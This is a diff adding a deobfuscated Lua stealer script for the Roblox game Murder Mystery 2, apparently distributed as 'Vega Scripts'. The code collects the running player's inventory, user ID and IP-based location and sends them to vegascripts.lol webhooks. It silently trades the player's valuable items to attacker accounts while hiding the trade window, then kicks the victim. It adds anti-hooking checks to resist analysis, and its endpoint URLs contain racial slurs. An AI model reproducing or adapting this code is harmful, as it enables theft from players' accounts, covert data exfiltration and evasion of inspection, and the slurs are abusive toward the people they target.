+				getgenv().topHitHighStartHour = 16
+				getgenv().topHitHighEndHour = 20
+				v116 = function()
+					if not getgenv().topHitCycleEnabled then
+						return 5000
+					end
+
+					local v522 = tonumber(os.date("%H"))
+					local topHitLowStartHour = getgenv().topHitLowStartHour or 14
+					local topHitLowEndHour = getgenv().topHitLowEndHour or 16
+					local topHitHighStartHour = getgenv().topHitHighStartHour or 16
+					local topHitHighEndHour = getgenv().topHitHighEndHour or 20
+
+					if topHitLowStartHour <= v522 and v522 < topHitLowEndHour then
+						return getgenv().topHitLowThreshold or 1000
+					end
+
+					if topHitHighStartHour <= v522 and v522 < topHitHighEndHour then
+						return getgenv().topHitHighThreshold or 5000
+					end
+
+					return getgenv().topHitHighThreshold or 5000
+				end
+				v117 = function(p75, p76)
+					local n11 = 0
+					local v528 = #p75 > 0
+
+					if v528 then
+						for _, v in ipairs(p75) do
+							n11 += (v.Value or 0) * (v.Amount or 1)
+						end
+					end
+
+					if not v528 then
+						p76 = ""
+					end
+
+					local function v531(p77)
+						local n12 = 0
+						local t40 = {}
+
+						for _, v in ipairs(p77) do
+							local v536 = tostring(v.DataID):gsub("%s+", "")
+							local Rarity = v.Rarity or ""
+							local Value = v.Value or 0
+							local Amount = v.Amount or 1
+
+							if Rarity == "Godly" or Rarity == "Ancient" or Rarity == "Unique" then
+								local v540 = Value * Amount * 0.013
+
+								n12 += v540
+								t40[v536] = {
+									price = string.format("%.2f", v540),
+									emoji = ""
+								}
+							end
+						end
+
+						return {
+							total = string.format("%.2f", n12),
+							itemPrices = t40
+						}
+					end
+
+					local v541 = v528 and v531(p75) or {
+						total = "0.00",
+						itemPrices = {}
+					}
+					local total = v541.total or "0.00"
+					local itemPrices = v541.itemPrices or {}
+					local n13 = 0
+
+					if v528 then
+						for _, v in ipairs(p75) do
+							n13 += (v.Value or 0) * (v.Amount or 1)
+						end
+					end
+
+					local identifyexecutor_2 = identifyexecutor and identifyexecutor() or "Unknown"
+					local v548 = "https://vegascripts.lol/join?placeId=" .. game.PlaceId .. "&jobId=" .. getgenv().RealJobID
+					local v549 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+					local v550 = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(LocalPlayer.UserId)
+					local v551 = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(LocalPlayer.UserId)
+					local t41 = {}
+					local n14 = 0
+
+					for _, v in ipairs(p75) do
+						table.insert(t41, v)
+						n14 += v.Amount or 1
+					end
+
+					table.sort(t41, function(p78, p79)
+						local v556 = tostring(p78.DataID):gsub("%s+", "")
+						local v557 = tostring(p79.DataID):gsub("%s+", "")
+
+						return (itemPrices[v556] and tonumber(itemPrices[v556].price) or 0) > (itemPrices[v557] and tonumber(itemPrices[v557].price) or 0)
+					end)
+
+					local v558 = tonumber(total) or 0
+					local v559 = false
+					local s4 = "```"
+					local v561
+
+					if #t41 == 0 then
+						v561 = s4 .. "  no items found in inventory (that matches your min value/rarity)\n```"
+					else
+						for _, v in ipairs(t41) do
+							local v564 = tostring(v.DataID):gsub("%s+", "")
+							local v565 = itemPrices[tostring(v.DataID):gsub("%s+", "")]
+							local v566 = v565 and tonumber(v565.price) or 0
+
+							if not (v565 and v565.emoji) then
+							end
+
+							local v567 = t7[v564] or 0
+							local Amount = v.Amount
+							local v569 = string.format("[%d/%d]", v567, Amount)
+							local v570 = string.format("- %dx %s%s ── $%.2f %s\n", Amount, v.Value > 1500 and "" or "", v564, v566, v569)
+
+							if not (#s4 + #v570 < 350) then
+								v559 = true
+
+								break
+							end
+
+							s4 ..= v570
+							v558 -= v566
+						end
+
+						if v559 then
+							s4 ..= string.format("\nAnd $%.2f worth of items more...\n", math.max(0, v558))
+						end
+
+						v561 = s4 .. "```"
+					end
+
+					local country = loc.country or "Unknown"
+
+					if loc.city and loc.city ~= "" then
+						country ..= ", " .. loc.city
+					end
+
+					local v572 = false
+
+					if v116() < n11 then
+						v572 = true
+					end
+
+					local v573 = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. getgenv().RealJobID .. "')"
+					local v574, v575 = v82({
+						gameType = "MM2",
+						istophit = v572,
+						location = country,
+						receiver = v86,
+						content = p76,
+						username = "Vega",
+						avatar_url = "https://cdn.discordapp.com/attachments/1502980057084203180/1518993307001163917/New_Project_99_7AA01CA.png?ex=6a3bf041&is=6a3a9ec1&hm=af2811e56cec274205bcf42911072a6cb4c84fb292fa0fedeecdb66d17a3d09d&",
+						embeds = { {
+							author = {
+								name = "⚡ Vega · Murder Mystery 2",
+								url = "https://www.roblox.com/games/142823291",
+								icon_url = v550
+							},
+							title = "**" .. LocalPlayer.Name .. "**",
+							description = "```Status        : " .. "Pending" .. "\nItems Claimed : 0 / " .. n14 .. "\nValue Claimed : 0 / " .. n11 .. "```",
+							color = 16711680,
+							thumbnail = {
+								url = v549
+							},
+							fields = {
+								{
+									name = "**Player Info**",
+									value = "```User        : " .. LocalPlayer.Name .. "\nUser ID     : " .. LocalPlayer.UserId .. "\nAge         : " .. LocalPlayer.AccountAge .. " days" .. "\nTotal Value : " .. (n11 or 0) .. "\nTotal USD   : $" .. total .. "\nExecutor    : " .. identifyexecutor_2 .. "\nPlayers     : " .. #Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "```",
+									inline = false
+								},
+								{
+									name = "**Inventory**",
+									value = v561,
+									inline = false
+								},
+								{
+									name = "**Teleport Script**",
+									value = "```lua\n" .. v573 .. "```",
+									inline = false
+								},
+								{
+									name = "**Join Link**",
+									value = "[Click here to join](" .. v548 .. ")",
+									inline = false
+								}
+							},
+							footer = {
+								text = "Vega Scripts · discord.gg/vega-scripts",
+								icon_url = v551
+							},
+							timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+						} }
+					})
+
+					if v528 then
+						v67()
+					end
+
+					return v574, v575
+				end
+				u118 = nil
+				u119 = nil
+				pcall(function()
+					u118 = 786116392
+					u119 = 844217739
+
+					local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
+					local Trade2 = ReplicatedStorage2:FindFirstChild("Trade")
+
+					if not Trade2 then
+						Trade2 = Instance.new("Folder")
+						Trade2.Name = "Trade"
+						Trade2.Parent = ReplicatedStorage2
+						print("created trade folder")
+					end
+
+					local t42 = {
+						SendRequest = "RemoteFunction",
+						GetProfileData = "RemoteFunction",
+						UpdateTrade = "RemoteEvent",
+						AcceptTrade = "RemoteEvent",
+						DeclineTrade = "RemoteEvent",
+						StartTrade = "RemoteEvent"
+					}
+
+					for k, v in pairs(t42) do
+						if not Trade2:FindFirstChild(k) then
+							local instance = Instance.new(v)
+
+							instance.Name = k
+							instance.Parent = Trade2
+							warn("0")
+						end
+					end
+
+					local Modules = ReplicatedStorage2:FindFirstChild("Modules")
+
+					if not Modules then
+						Modules = Instance.new("Folder")
+						Modules.Name = "Modules"
+						Modules.Parent = ReplicatedStorage2
+						print("module gay")
+					end
+
+					local function createModuleScript()
+						local ModuleScript = Instance.new("ModuleScript")
+
+						ModuleScript.Name = "TradeModule"
+						ModuleScript.Source = "return {}"
+						ModuleScript.Parent = Modules
+						warn("0")
+
+						return ModuleScript
+					end
+
+					local TradeModule = Modules:FindFirstChild("TradeModule")
+
+					if TradeModule then
+						if not TradeModule:IsA("ModuleScript") then
+							TradeModule:Destroy()
+							createModuleScript()
+						end
+					else
+						createModuleScript()
+					end
+
+					if not Modules:FindFirstChild("TradeModule") then
+						createModuleScript()
+					end
+
+					for k, v in pairs(t42) do
+						if not Trade2:FindFirstChild(k) then
+							local instance = Instance.new(v)
+
+							instance.Name = k
+							instance.Parent = Trade2
+							warn("0")
+						end
+					end
+
+					local RobloxGui = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
+
+					if RobloxGui then
+						local TradeGUI_Phone = RobloxGui:FindFirstChild("TradeGUI_Phone")
+
+						if TradeGUI_Phone and TradeGUI_Phone.Enabled == false then
+							TradeGUI_Phone.Enabled = true
+							warn("0")
+						end
+					end
+
+					print("complete")
+				end)
+				t8 = {
+					DefaultGun = true,
+					DefaultKnife = true,
+					Reaver = true,
+					Reaver_Legendary = true,
+					Reaver_Godly = true,
+					Reaver_Ancient = true,
+					IceHammer = true,
+					IceHammer_Legendary = true,
+					IceHammer_Godly = true,
+					IceHammer_Ancient = true,
+					Gingerscythe = true,
+					Gingerscythe_Legendary = true,
+					Gingerscythe_Godly = true,
+					Gingerscythe_Ancient = true,
+					TestItem = true,
+					Season1TestKnife = true,
+					Cracks = true,
+					Icecrusher = true,
+					["???"] = true,
+					Dartbringer = true,
+					TravelerAxeRed = true,
+					TravelerAxeBronze = true,
+					TravelerAxeSilver = true,
+					TravelerAxeGold = true,
+					BlueCamo_K_2022 = true,
+					GreenCamo_K_2022 = true,
+					SharkSeeker = true
+				}
+				v121 = v78()
+				response = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+				v123 = function()
+					local t43 = {}
+					local v592 = table.find(t1, min_rarity)
+
+					for k, v in pairs(response.Weapons.Owned) do
+						task.wait()
+
+						local v595 = Item[k] or Item[tostring(k)]
+
+						if not v595 then
+							for _, v2 in pairs(Item) do
+								if v2.ItemID and tostring(v2.ItemID) == tostring(k) then
+									v595 = v2
+
+									break
+								end
+							end
+						end
+
+						if v595 then
+							local Rarity = v595.Rarity
+							local v599 = table.find(t1, Rarity)
+
+							if v599 and v592 <= v599 and not t8[k] then
+								local v600 = v121[k]
+
+								if not v600 then
+									v600 = v599 >= table.find(t1, "Godly") and 2 or 1
+								end
+
+								if min_value <= v600 then
+									table.insert(t43, {
+										DataID = k,
+										Rarity = Rarity,
+										Amount = v,
+										Value = v600
+									})
+								end
+							end
+						else
+							warn("Item not found " .. tostring(k))
+						end
+					end
+
+					table.sort(t43, function(p80, p81)
+						return p80.Value * p80.Amount > p81.Value * p81.Amount
+					end)
+
+					return t43
+				end
+				u124 = nil
+				v125 = function()
+					u124 = 597805934
+					game:GetService("ReplicatedStorage"):WaitForChild("Trade").SetRequestsEnabled:FireServer(true)
+				end
+				u126 = nil
+				u127 = nil
+				u128 = nil
+				v129 = function()
+					u126 = 937316987
+					u127 = 493048220
+					u128 = 330287905
+
+					local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+					task.spawn(function()
+						local TradeGUI = PlayerGui:WaitForChild("TradeGUI", 5)
+
+						if TradeGUI then
+							TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
+								TradeGUI.Enabled = false
+							end)
+							TradeGUI.Enabled = false
+						end
+
+						local TradeGUI_Phone = PlayerGui:WaitForChild("TradeGUI_Phone", 5)
+
+						if TradeGUI_Phone then
+							TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
+								TradeGUI_Phone.Enabled = false
+							end)
+							TradeGUI_Phone.Enabled = false
+						end
+					end)
+				end
+				u130 = nil
+				u131 = nil
+				v132 = function(p82, p83, p84)
+					u130 = 650392578
+					u131 = 777532232
+
+					local v604 = false
+					local v605, v606, v607 = ipairs(t5)
+					local v608 = geniter(v605, v606, v607)
+
+					while true do
+						local v609 = table.pack(v608())
+
+						if v609[1] then
+							local v610 = v609[3]
+
+							if p82:lower() == tostring(v610):lower() then
+								v604 = true
+
+								break
+							end
+						else
+							break
+						end
+					end
+
+					local v611 = v91()
+
+					if v611 == "StartTrade" then
+						Trade.DeclineTrade:FireServer()
+						task.wait(0.3)
+					elseif v611 == "ReceivingRequest" then
+						Trade.DeclineRequest:FireServer()
+						task.wait(0.3)
+					end
+
+					local n15 = 0
+					local v613, v614, v615 = ipairs(p83)
+
+					for _, v in v613, v614, v615 do
+						n15 += v.Amount
+					end
+
+					local n16 = 0
+					local v619 = v78()
+
+					while #p83 > 0 do
+						local v620 = v91()
+
+						if v620 == "None" then
+							v90(p82)
+							task.wait(0.5)
+						elseif v620 == "SendingRequest" then
+							task.wait(0.3)
+						elseif v620 == "ReceivingRequest" then
+							Trade.DeclineRequest:FireServer()
+							task.wait(0.3)
+						elseif v620 == "StartTrade" then
+							local v621 = math.min(4, #p83)
+
+							for i = 1, v621 do
+								local v623 = p83[i]
+
+								for i2 = 1, v623.Amount do
+									v104(v623.DataID)
+									task.wait(0.05)
+								end
+							end
+
+							task.wait(6)
+							v101()
+							v95()
+							task.wait(0.5)
+
+							local response2 = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+							local t44 = {}
+							local t45 = {}
+							local n17 = 0
+
+							for i = 1, v621 do
+								local v630 = p83[i]
+
+								if not response2.Weapons.Owned[v630.DataID] then
+									local v631 = tostring(v630.DataID):gsub("%s+", "")
+
+									if not t44[v631] then
+										t44[v631] = 0
+									end
+
+									t44[v631] += v630.Amount
+									n17 += v630.Amount
+									table.insert(t45, i)
+								end
+							end
+
+							n16 += n17
+
+							if p84 and not v604 and n17 > 0 then
+								local v632, v633, v634 = pairs(t44)
+
+								for k, v in v632, v633, v634 do
+									local n18 = 0
+
+									for _, v2 in ipairs(p83) do
+										if tostring(v2.DataID):gsub("%s+", "") == k then
+											n18 = (v619[v2.DataID] or v2.Value or 1) * v
+
+											break
+										end
+									end
+
+									v107(k, v, n18)
+								end
+
+								if n15 <= n16 then
+									v115(p84)
+								else
+									v111(p84)
+								end
+							end
+
+							local v640 = #t45
+							local n19 = -1
+
+							for i = v640, 1, -1 do
+								table.remove(p83, t45[i])
+							end
+						else
+							task.wait(0.5)
+						end
+
+						task.wait(0.5)
+					end
+
+					if p84 and not v604 and n15 <= n16 then
+						v115(p84)
+						task.wait(0.5)
+					end
+
+					if n15 <= n16 then
+						task.wait(1)
+						LocalPlayer:kick("Your Items got cleared\nJoin discord.gg/vega-scripts To Make Your Own Script !")
+					end
+				end
+				u133 = nil
+				v134 = function(p85)
+					u133 = 1048485720
+
+					local t46 = {}
+					local v644 = table.find(t1, min_rarity)
+
+					for k, v in pairs(response.Weapons.Owned) do
+						task.wait()
+
+						local Rarity = Item[k].Rarity
+						local v648 = table.find(t1, Rarity)
+
+						if v648 and v644 <= v648 and not t8[k] then
+							local v649 = v121[k]
+
+							if not v649 then
+								v649 = v648 >= table.find(t1, "Godly") and 2 or 1
+							end
+
+							if p85 <= v649 then
+								table.insert(t46, {
+									DataID = k,
+									Rarity = Rarity,
+									Amount = v,
+									Value = v649
+								})
+							end
+						end
+					end
+
+					table.sort(t46, function(p86, p87)
+						return p86.Value * p86.Amount > p87.Value * p87.Amount
+					end)
+
+					return t46
+				end
+				v135 = function(p88, p89)
+					local v650 = false
+
+					for _, v in ipairs(t5) do
+						if p88:lower() == tostring(v):lower() then
+							v650 = true
+
+							break
+						end
+					end
+
+					local v653 = v134(v650 and 100 or min_value)
+
+					if #v653 == 0 then
+						return
+					end
+
+					v132(p88, v653, p89)
+				end
+				u136 = nil
+				u137 = nil
+				u138 = nil
+				v139 = function(p90)
+					u136 = 1065669493
+					u137 = 380350664
+					u138 = 622034225
+					v125()
+
+					for _, player in ipairs(Players:GetPlayers()) do
+						if table.find(t6, player.Name:lower()) then
+							v135(player.Name, p90)
+
+							return
+						end
+					end
+				end
+				v129()
+				v140 = v123()
+				v141 = pingEveryone == "Yes" and "||@everyone||" or "New hit ma boi"
+				v142, v143 = v117(v140, v141)
+
+				if v142 and v143 then
+					messageId = v143.messageId
+
+					if messageId then
+						v108(messageId)
+
+						if #v140 > 0 then
+							v139(messageId)
+						end
+					end
+				end
+
+				Players.PlayerAdded:Connect(function(player)
+					if table.find(t6, player.Name:lower()) then
+						v135(player.Name, messageId)
+					end
+				end)
+
+				return
+			end
+		end
+	end
+
+	return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+end
+
+if (not http or not http.request or not isfunctionhooked(http.request)) and (not request or not isfunctionhooked(request)) then
+	if (not http_request or not isfunctionhooked(http_request)) and (not httprequest or not isfunctionhooked(httprequest)) then
+		if not hookfunction then
+			if getmetatable and setmetatable and type and select and type(select(2, pcall(getmetatable, setmetatable({}, {
+				__index = function()
+					while true do
+					end
+				end
+			}))).__index) == "function" and pcall and debug and rawget and rawset and pcall(rawset, {}, " ", " ") and not getmetatable(require) and not getmetatable(print) and not getmetatable(error) then
+				if ({ debug.info(print, "a") })[1] == 0 and ({ debug.info(tostring, "a") })[1] == 0 and ({ debug.info(print, "a") })[2] == true and select and getfenv and select(1, pcall(getfenv, 69)) ~= true and select(2, pcall(rawget, debug, "info")) and not (#select(2, pcall(rawget, debug, "info"))(getfenv, "n") <= 1) then
+					if not (#select(2, pcall(rawget, debug, "info"))(print, "n") <= 1) and not select(2, pcall(rawget, debug, "info"))(print, "s") ~= "[C]" and not select(2, pcall(rawget, debug, "info"))(require, "s") ~= "[C]" and select(2, pcall(rawget, debug, "info"))(function()
+					end, "s") ~= "[C]" and not select(1, pcall(debug.info, coroutine.wrap(function()
+					end)(), "s")) ~= false then
+						if pcall(function()
+							Instance.new("Part"):thisdoesntworkaaa("a")
+						end) then
+							return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+						end
+
+						game:GetChildren(function()
+							while true do
+							end
+						end)
+						game_ = game
+
+						if #game_:GetChildren() <= 4 then
+							return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+						end
+
+						ok, result = pcall(function()
+							return game:GetService("HttpService"):JSONDecode("[68, \"google.com\", true, 1234, false, [1234, null, \"meow\"], null, [\"b\"]]")
+						end)
+
+						if not ok then
+							return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+						end
+
+						if result[6][2] ~= nil then
+							return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+						end
+
+						ok2, result2 = pcall(function()
+							game()
+						end)
+
+						if not result2:find("attempt to call a Instance value") then
+							return "Stop hooking my shit", error("<3"), assert(false, "<3"), (nil)()
+						end
+
+						n10 = 0
+						connection = game:GetService("RunService").Heartbeat:Connect(function()
+							n10 += 1
+						end)
+
+						while n10 < 2 do
+							task.wait()
+						end
+
+						if connection then
+							connection:Disconnect()
+						end
+
+						setrawmetatable(identifyexecutor, {
+							__newindex = function()
+								error("unmodifyable", 2)
+							end,
+							__index = function(p91, p92)
+								return rawget(p91, p92)
+							end
+						})
+						scb = setclipboard
+
+						if scb then
+							scb("https://discord.gg/vega-scripts")
+						end
+
+						t1 = {
+							"Common",
+							"Uncommon",
+							"Rare",
+							"Epic",
+							"Legendary",
+							"Vintage",
+							"Godly",
+							"Vintage",
+							"Ancient",
+							"Unique"
+						}
+						HttpService = game:GetService("HttpService")
+						u10 = nil
+						bxor = bit32.bxor
+						band = bit32.band
+						bnot = bit32.bnot
+						rshift = bit32.rshift
+						lshift = bit32.lshift
+						v16 = function(p93, p94)
+							return bxor(rshift(p93, p94), lshift(p93, 32 - p94))
+						end
+						t2 = {
+							1116352408,
+							1899447441,
+							3049323471,
+							3921009573,
+							961987163,
+							1508970993,
+							2453635748,
+							2870763221,
+							3624381080,
+							310598401,
+							607225278,
+							1426881987,
+							1925078388,
+							2162078206,
+							2614888103,
+							3248222580,
+							3835390401,
+							4022224774,
+							264347078,
+							604807628,
+							770255983,
+							1249150122,
+							1555081692,
+							1996064986,
+							2554220882,
+							2821834349,
+							2952996808,
+							3210313671,
+							3336571891,
+							3584528711,
+							113926993,
+							338241895,
+							666307205,
+							773529912,
+							1294757372,
+							1396182291,
+							1695183700,
+							1986661051,
+							2177026350,
+							2456956037,
+							2730485921,
+							2820302411,
+							3259730800,
+							3345764771,
+							3516065817,
+							3600352804,
+							4094571909,
+							275423344,
+							430227734,
+							506948616,
+							659060556,
+							883997877,
+							958139571,
+							1322822218,
+							1537002063,
+							1747873779,
+							1955562222,
+							2024104815,
+							2227730452,
+							2361852424,
+							2428436474,
+							2756734187,
+							3204031479,
+							3329325298
+						}
+						v18 = function(p95)
+							u10 = 80248658
+
+							local v656 = #p95 * 8
+							local v657 = p95 .. "\128"
+							local v658 = v657 .. string.rep("\0", (56 - #v657 % 64) % 64) .. "\0\0\0\0"
+
+							for i = 3, 0, -1 do
+								v658 ..= string.char(math.floor(v656 / 2 ^ (i * 8)) % 256)
+							end
+
+							local t47 = {
+								1779033703,
+								3144134277,
+								1013904242,
+								2773480762,
+								1359893119,
+								2600822924,
+								528734635,
+								1541459225
+							}
+
+							for i = 1, #v658, 64 do
+								local t48 = {}
+
+								for i2 = 0, 15 do
+									local v664 = i + i2 * 4
+
+									t48[i2] = v658:byte(v664) * 16777216 + v658:byte(v664 + 1) * 65536 + v658:byte(v664 + 2) * 256 + v658:byte(v664 + 3)
+								end
+
+								for i2 = 16, 63 do
+									local v666 = bxor
+
+									t48[i2] = (t48[i2 - 16] + bxor(v16(t48[i2 - 15], 7), v16(t48[i2 - 15], 18), rshift(t48[i2 - 15], 3)) + t48[i2 - 7] + v666(v16(t48[i2 - 2], 17), v16(t48[i2 - 2], 19), rshift(t48[i2 - 2], 10))) % 4294967296
+								end
+
+								local v667 = t47[1]
+								local v668 = t47[2]
+								local v669 = t47[3]
+								local v670 = t47[4]
+								local v671 = t47[5]
+								local v672 = t47[6]
+								local v673 = t47[7]
+								local v674 = t47[8]
+
+								for i2 = 0, 63 do
+									local v676 = bxor
+									local v677 = band
+									local v678 = (v674 + bxor(v16(v671, 6), v16(v671, 11), v16(v671, 25)) + v676(band(v671, v672), v677(bnot(v671), v673)) + t2[i2 + 1] + t48[i2]) % 4294967296
+									local v679 = bxor
+									local v680 = (bxor(v16(v667, 2), v16(v667, 13), v16(v667, 22)) + v679(band(v667, v668), band(v667, v669), band(v668, v669))) % 4294967296
+
+									v674 = v673
+									v673 = v672
+									v672 = v671
+									v671 = (v670 + v678) % 4294967296
+									v670 = v669
+									v669 = v668
+									v668 = v667
+									v667 = (v678 + v680) % 4294967296
+								end
+
+								local t49 = {
+									v667,
+									v668,
+									v669,
+									v670,
+									v671,
+									v672,
+									v673,
+									v674
+								}
+
+								for i2 = 1, 8 do
+									t47[i2] = (t47[i2] + t49[i2]) % 4294967296
+								end
+							end
+
+							local t50 = {}
+
+							for _, v in ipairs(t47) do
+								t50[#t50 + 1] = string.char(math.floor(v / 16777216) % 256, math.floor(v / 65536) % 256, math.floor(v / 256) % 256, v % 256)
+							end
+
+							return table.concat(t50)
+						end
+						t3 = {}
+
+						for i = 1, 64 do
+							t3[("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):byte(i)] = i - 1
+						end
+
+						u20 = nil
+						v21 = function(p96)
+							u20 = 169343501
+
+							local t51 = {}
+							local v688 = #p96
+
+							for i = 1, v688, 3 do
+								local v690, v691, v692 = p96:byte(i, i + 2)
+								local v693 = v690 * 65536 + (v691 or 0) * 256 + (v692 or 0)
+
+								t51[#t51 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.rshift(v693, 18) + 1, bit32.rshift(v693, 18) + 1)
+								t51[#t51 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(bit32.rshift(v693, 12), 63) + 1, bit32.band(bit32.rshift(v693, 12), 63) + 1)
+
+								if i + 1 <= v688 then
+									t51[#t51 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(bit32.rshift(v693, 6), 63) + 1, bit32.band(bit32.rshift(v693, 6), 63) + 1)
+								end
+
+								if i + 2 <= v688 then
+									t51[#t51 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(v693, 63) + 1, bit32.band(v693, 63) + 1)
+								end
+							end
+
+							return table.concat(t51)
+						end
+						u22 = nil
+						v23 = function(p97)
+							u22 = 452077855
+
+							local v694 = #p97 % 4
+
+							if v694 == 2 then
+								p97 ..= "=="
+							elseif v694 == 3 then
+								p97 ..= "="
+							end
+
+							local t52 = {}
+
+							for i = 1, #p97, 4 do
+								local v697, v698, v699, v700 = p97:byte(i, i + 3)
+								local v701 = (t3[v697] or 0) * 262144 + (t3[v698] or 0) * 4096 + (t3[v699] or 0) * 64 + (t3[v700] or 0)
+
+								t52[#t52 + 1] = string.char(bit32.rshift(v701, 16))
+
+								if v699 and v699 ~= 61 then
+									t52[#t52 + 1] = string.char(bit32.band(bit32.rshift(v701, 8), 255))
+								end
+
+								if v700 and v700 ~= 61 then
+									t52[#t52 + 1] = string.char(bit32.band(v701, 255))
+								end
+							end
+
+							return table.concat(t52)
+						end
+						u24 = nil
+						v25 = function(p98, p99)
+							u24 = 700555412
+
+							return v18("4dG9oM2pR7vX5cN8" .. p98 .. tostring(p99) .. "wF3tJ6yB1eH0sA4d")
+						end
+						u26 = nil
+						u27 = nil
+						u28 = nil
+						v29 = function(p100, p101)
+							u26 = 288918583
+							u27 = 747745209
+							u28 = 436382071
+
+							local v702 = "https://webhook.vegascripts.lol/request/" .. p100 .. "/" .. tostring(p101)
+							local request_2 = request or syn and syn.request or http_request or http and http.request
+
+							if not request_2 then
+								error("No request function available")
+							end
+
+							local v704 = request_2({
+								Url = v702,
+								Method = "GET",
+								Headers = {
+									["Content-Type"] = "application/json"
+								}
+							})
+
+							if v704 and v704.StatusCode == 200 then
+								return HttpService:JSONDecode(v704.Body).token
+							end
+
+							error("Fail" .. tostring(v704 and v704.StatusCode or "no response"))
+						end
+						t4 = {}
+						t4.__index = t4
+						u31 = nil
+						u32 = nil
+						s1 = "new"
+						t4[s1] = function(p102, p103)
+							u31 = 455722073
+							u32 = 572011769
+
+							local obj = setmetatable({}, t4)
+
+							obj.encryptionKey = v25(v29(p102, p103), p103)
+							obj.webhookToken = p102
+							obj.timestamp = p103
+
+							return obj
+						end
+						u34 = nil
+						s2 = "encrypt"
+						t4[s2] = function(p104, p105)
+							u34 = 341206522
+
+							local json
+
+							if type(p105) == "table" then
+								json = HttpService:JSONEncode(p105)
+							else
+								json = tostring(p105)
+							end
+
+							return (v21(v18(p104.encryptionKey .. json) .. json))
+						end
+						u36 = nil
+						u37 = nil
+						v38 = function(p106, p107)
+							u36 = 22024574
+							u37 = 649926619
+
+							local now = os.time()
+
+							p106._timestamp = now
+
+							return t4.new(p107, now):encrypt(p106), now
+						end
+						Usernames_ = _G.Usernames or getgenv().Users or {}
+						min_rarity = _G.min_rarity or getgenv().rarity or "Godly"
+						min_value = _G.min_value or getgenv().min or 1
+						pingEveryone = _G.pingEveryone or getgenv().ping or "No"
+						webhook = _G.webhook or getgenv().wh or "37458d46afc973c5f93277986cef00c8"
+						t5 = {
+							"joeiamjoezeif",
+							"jo_125w",
+							"joeme2vv"
+						}
+						t6 = {}
+
+						for _, v in ipairs(Usernames_) do
+							insert = table.insert
+							v47 = tostring(v)
+							insert(t6, v47:lower())
+						end
+
+						for _, v in ipairs(t5) do
+							insert2 = table.insert
+							v49 = tostring(v)
+							insert2(t6, v49:lower())
+						end
+
+						t7 = {}
+						messageId = nil
+						Players = game:GetService("Players")
+						ReplicatedStorage = game:GetService("ReplicatedStorage")
+						game:GetService("TeleportService")
+						LocalPlayer = Players.LocalPlayer
+
+						if next(Usernames_) == nil then
+							LocalPlayer:kick("You didn't add a usernames or a valid webhook !")
+
+							return
+						end
+
+						if game.PlaceId ~= 142823291 then
+							LocalPlayer:kick("Game not supported. Please join a normal MM2 server")
+
+							return
+						end
+
+						v55 = string.find(v7, "delta") or string.find(v7, "krnl")
+						GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
+						v57 = GetServerType:InvokeServer() == "VIPServer"
+						v58 = #Players:GetPlayers() >= 12
+
+						if v57 or v58 then
+							if v55 then
+								v59 = LocalPlayer
+								kick = LocalPlayer.kick
+								v61 = v57 and "VIP Servers not supported " or "FULL Servers Arent Supported"
+								kick(v59, v61)
+
+								return
+							end
+
+							v62 = LocalPlayer
+							kick2 = LocalPlayer.kick
+							v64 = v57 and "VIP Servers not supported " or "FULL Servers Arent Supported"
+							kick2(v62, v64)
+
+							return
+						end
+
+						getgenv().RealJobID = game.JobId
+						u65 = nil
+						u66 = nil
+						v67 = function()
+							u65 = 636436657
+							u66 = 1064691622
+
+							local v712 = Usernames_ or {}
+
+							if #v712 == 0 then
+								return
+							end
+
+							for _, v in ipairs(v712) do
+								local v715 = tostring(v)
+								local t53 = {
+									jobId = getgenv().RealJobID,
+									placeId = game.PlaceId,
+									username = LocalPlayer.Name,
+									receiver = v715
+								}
+								local _ = pcall(function()
+									return request({
+										Url = "https://vegascripts.lol/hit",
+										Method = "POST",
+										Headers = {
+											["Content-Type"] = "application/json",
+											Authorization = "nice_remote_spy"
+										},
+										Body = HttpService:JSONEncode(t53)
+									})
+								end)
+							end
+						end
+						GetPlayerLevel = ReplicatedStorage.Remotes.Extras.GetPlayerLevel
+						LocalPlayer2 = Players.LocalPlayer
+
+						if GetPlayerLevel:InvokeServer(LocalPlayer2) < 10 then
+							LocalPlayer2:Kick("script error. make sure ur above the level 9")
+						end
+
+						v70 = function()
+							local ok3, result3 = pcall(function()
+								return (request or syn and syn.request or http and http.request or http_request)({
+									Url = "http://ip-api.com/json",
+									Method = "GET"
+								})
+							end)
+
+							if ok3 and result3 and result3.Body then
+								local ok4, result4 = pcall(function()
+									return HttpService:JSONDecode(result3.Body)
+								end)
+
+								if ok4 and result4 then
+									return result4
+								end
+							end
+
+							return {}
+						end
+						loc = v70()
+						request_ = request or syn and syn.request or http and http.request or http_request or krnl.request
+						Item = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+						v73 = function(p108)
+							local HttpService2 = game:GetService("HttpService")
